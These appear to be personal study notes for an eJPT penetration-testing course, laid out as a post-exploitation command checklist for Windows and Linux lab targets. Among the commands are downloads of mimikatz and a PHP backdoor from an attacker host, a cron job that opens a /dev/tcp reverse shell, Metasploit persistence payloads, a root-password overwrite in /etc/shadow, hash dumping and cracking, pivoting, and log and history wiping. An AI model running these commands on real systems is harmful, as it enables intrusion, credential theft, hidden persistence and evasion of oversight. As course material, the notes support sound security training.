# 08hakr's Short notes of e	JPT
# 010 INE-Host-and-Network-Penetration-Testing-Exploitation

## Windows Enumeration
### Enumerating SYstem Info
- Hostname, Os Name, Os Build & service Pack, Os Architecture, Installed Updates/Hotfixes Patches
- nmap -sV <target-ip>
- searchsploit
- getuid , sysinfo
- shell
- hostname
- systeminfo : Os info, hotfixes, build number.
- wmic qfe get Caption,Description,HotFixID,InstalledOn
- cd C:\Windows\System32\\
- cat eula.txt same info

### Enumerating Users & Groups
- current User & Privileges, Additional User Information, Other Users on The system, Groups, Members of Built-in Administrator Group
- getuid
- getprivs
- search logged_on
- use set run
- shell
- whoami /priv
- query user Logged on Users
- net users 
- net user administrator
- net localgroup
- net localgroup Administrators

### Enumerating Network Information
- Current IP & network Adapter, Internal Networks, TCP/UDP Service running and their respective ports, Other Hosts on the Network, Routing table, Windows Firewall state
- shell
- ipconfig /all
- route print
- arp -a to list other devices on the network
- netstat -ano
- netsh firewall show state OR netsh advfirewall show allprofiles note: Use tab to get menu
- 
### Enumerating Processes & Services
- Running Process & Services, Scheduled Tasks
- meterpreter
- ps
- shell
- net start
- wmic service list brief
- tasklist /SVC list out running process as well what services running inside that process.
- schtasks /query /fo LIST
- schtasks /query /fo LIST /v
- show_mount to view Drive in target system

### Automating Windows Local Enumeration WinRM 5985
- github.com/411Hall/JAWS
- nmap -sV -p 5985 <target-ip>
- search winrm 
- use set run
- set Force_VBS true
- search win_privs
- search enum_logged
- search checkvm
- search enum_applications 
- search enum_computers
- search enum_patches
- search enum_shares
- download jswa-enum.ps1
- meterpreter upload jaws-enum.ps1
- shell
- powershell.exe -ExecutionPolicy Bypass -File jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
- meterpreter 
- download JAWS-Enum.txt

## Linux Enumeration
### Enumerating System Information
- Hostname, Distribution And Release Version Kernel Version and Architecture, CPU Information, Disl Information and Mounted Drives Installed Package/SOftware
- nmap 
- search use set run
- meterpreter
- sysinfo
- getuid
- shell
- hostname
- cat /etc/issue*
- cat /etc/*release
- uname -a
- env
- lscpu
- free -h RAM
- df -h Filesystem 
- lsblk Storage Devices
- dpkg -l list install package
- 
### Enumerating Users And Groups
-  
- use set run 
- getuid
- whoami
- groups root
- cat /etc/passwd user accounts and service accounts
- useradd -m bob -S /bin/bash
- groups
-  usermod -aG root bob add user to group
- last last login user display only legitamate login via SSH OR TTY session
- lastlog 
- 
### Enumerating Network Information
- current IP network Adapter, Internal Networks, TCP/UDP services running and there respective ports, Other hosts on the network
- nmap use set run
- ifconfig
- netstat TCP/UDP running process on network
- route
- shell
- ip a s
- cat /etc/networks interfaces and configuration 
- cat /etc/hostname domain 
- cat /etc/hosts internal Network
- cat /etc/resolv.conf nameserver
- arp -a OR go in menterpreter
- arp
- 
### Enumerating Processes and Cron Jobs
- RUnning Services, Cron Jobs
- ps
- pgrep
- shell
- ps aux
- top all running process
- crontab -l
- ls -al /etc/cron*
- cat /etc/cron*
- 
### Automating Linux Local Enumeration
- https://github.com/rebootuser/LinEnum
- nmap -sV <target-ip>
- shellshock
- search enum_configs
- search
- search enum_network
- search enum_system
- search checkvm
- now copy the lienum file and paste it in lab env and run after assigning +x permission
- ./LinEnum.sh
- 

## Transferring Files to Target System
### Python Server
- SimpleHTTPServer Python2 and http.server Python3
- python -m SimpleHTTPServer 80
- python3 -m http.server

### Transferring Files to Windows Targets
- nmap
- Procedure: need to put nc.exe in windows then start the listener and run the .py script of rejetto.
- cd /usr/share/windows-binaries
- python3 -m http.server 80
- nc -lvnp 1234
- and then run .py exploit twice
- certutil -urlcache -f http://<attacker-ip>/mimicatz.exe mimikatz.exe
- .\mimikatz.exe
- privilege::debug  
- 
### Transferring Files to Linux Target
- nmap
- search samba/*pipename
- cd /usr/share/webshells
- python3 -m http.server
- wget http://<attacker_ip>php-backdoor.php
- 
## Shells
### Upgrading non Interactive Shell
- cat /etc/shells
- /bin/bash -i
- python --version
- python -c 'import pty; pty.spawn("/bin/bash")'
- perl --help
- perl -e 'exec "/bin/bash";'
- ruby: exec "/bin/bash"
- env
- export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/in
- export TERM=xterm
- export SHELL=bash
## Escalation
### Windows Privilege Escalation Vulnerabilities
- github.com/itm4n/PrivescCheck
- gaining access metasploit module web_delivery
- search web_delivery
- set target PSH\ (Binary)
- set payload windows/shell/reverse_tcp
- set PSH-EncodedCommand false
- set lhost eth1
- exploit
- copyt the given code and then run this in code in windows cmd
- search shell_to_meterpreter
- set lhost eth1
- set session 1
- show advanced
- set Win_Transfer VBS
- migrate explorer process id
- getprivs
- getuid
- cd C:\Users\student\Desktop\PrivesecCheck\\
- goto the repo copy the basic usage from a command prompt
powershell
- paste it and run
- powershell -ep bypass .\script.ps1 (PowerShell command can be used to bypass the default execution policy when running PowerShell scripts from the Windows command line)
-
- WinLogOn Feature
- psexec.py Administrator@<target-ip>
- msfconsole
- search psexec
- use set run
- 
### Linux Privilege Escalation
- weak Permissions
- whoami
- cat /etc/passwd
- groups
- cat /etc/group
- find / -not -type l -perm -o+w
- cat /etc/shadow
- ls -al /etc/shadow
- openssl paswswd -1 -salt abc password123
- copy that value and paste it in root:here:*
- and try for su

- There is no specific hint given in this challenge, so start with finding setuid program approach.
- find / -user root -perm -4000 -exec ls -ldb {} \;
- sudo -l

- Sudo Privileges
- cat /etc/passwd
- sudo -l
- sudo man ls
- !/bin/bash
- cat flag

## Persistence
### Persistence Via Services On Windows require eliveted permission 
- nmap
- use set run
- search persistence_service
- run THis paylload run in evry 5sec on target it generats a msfvenom payload. that runs on win in every 5sec.
- terminates all the session and restart msfconsole
- set multi/handler
- set payload windows/meterpreter/reverse_tcp
- set lhost and lport and run
- BOOM! you got the sessions
- 
### Persistence via RDP OR Backdoor OR New User
- search badblue
- getuid
- sysinfo and migrate
- run getgui -e -u <newUser> -p <password>
- new terminal
- xfreerdp /u:<user> /p:<password> /v:<target-ip>

### Linux Persistence Via SSH Key
- ssh student@<target-ip>
- cd .ssh/
- ls
- cat id_rsa
- exit
- scp student@<target-ip>:~/.ssh/id_rsa
- chmod 400 id_rsa
- now login with student and rm wait
- ssh -i id_Rsa student@<target-ip>
- proper path is
 - generate a ssh key pair
 - keep the private key on to the system and transfer the publick key to the target system.
 - /home/.ssh/Autorized_keys
 -  
### Persistence via a cron Jobs
- ssh student@<target-ip>
- cat /etc/cron*
- echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp<attacker-ip>/<listing-port> 0>&1'" > cron
- cat cron
- crontab -i cron
- crontab -l
- now remove rm wait
- nc -lvnp 1234
- ls -al
- cat flag.txt
- 
## Dumping And Cracking
### Dumping and Cracking NTLM Hashes Windows
- SAM database
- LM and NTLM
- hashdump in metasploit
- mimikatz
- jhon the ripper
- hashcat 
- nmap and take access of the system
- sysinfo
- getuid
- getprivs
- pgrep lsass
- migrate
- hashdump
- nano hashes.txt
- paste as it is
- john --list=formats
- john --format=NT hashes.txt --wordlist=
- hashcat
- gzip -d /usr/share/wordlists/rockyou.txt.gz
- hashcat -m 1000 -a 3 hashes/txt /usr/share/wordlists/rockyou.txt 

### Dumping and Cracking Linux Password hashes
- /etc/shadow
- nmap
- identify use set run
- cat /etc/shadow
- ctrl+z
- sessions
- sessions -u 1
- search hashdump
- use set run
- cat the content of the loot file 
- exit
- gzip -d /usr/share/wordlists/rockyou.txt.gz
- jhon --format=sha512crypt <LOOT_FILE> --wordlist=/usr/share/wordlists/rockyou.txt
- hashcat -a3 -m 1800 <LOOT_FILE> <wordlists>
-
## Pivoting Lesson
### Pivoting
- nmap -sV <target-ip-1>
- search rejetto 
- use set run
- sysinfo 
- getuid
- ipconfig
- run autoroute -s <add-subnet> like this 10.0.29.0/20
- run autoroute -p
- run arp_scanner -r 192.168.89.0/24 for the internal network scan
- background
- search portscan
- use set run
- sessions 1
- portfwd add -l 1234 -p 80 -r <target-ip-2>
- new terminal
- nmap -sV -p1234 localhost
- in current metasploit
- background
- use 1
- search badblue
- set paylload windows/meterpreter/bind_tcp
- set rhosts <vicitm-2-ip>
- exploit
- 
## Clearing
### Clearing your Tracks On Windows
- stored all scripts that has been stored on target system C:/Temp 
- /tmp
- windows Evenet Log
- nmap -sV <target-ip>
- msfconsole
- search badblue
- use set run
- show advanced 
- show info
- sysinfo
- getuid
- migrate
- search persistence platform:windows
- session 1
- resource /PATH-OF-SCRIPT
- clearev
- 
### Clearing Your Tracks On Linux
- namp -sV <target-ip>
- use set run
- /tmp
- cd ~
- ls -al
- .bash_history
- .bashrc
- open this .bash_history file and delete all the command that you used on target system.
- history
- history -c
- cat /dev/null > .bash_history 
## 
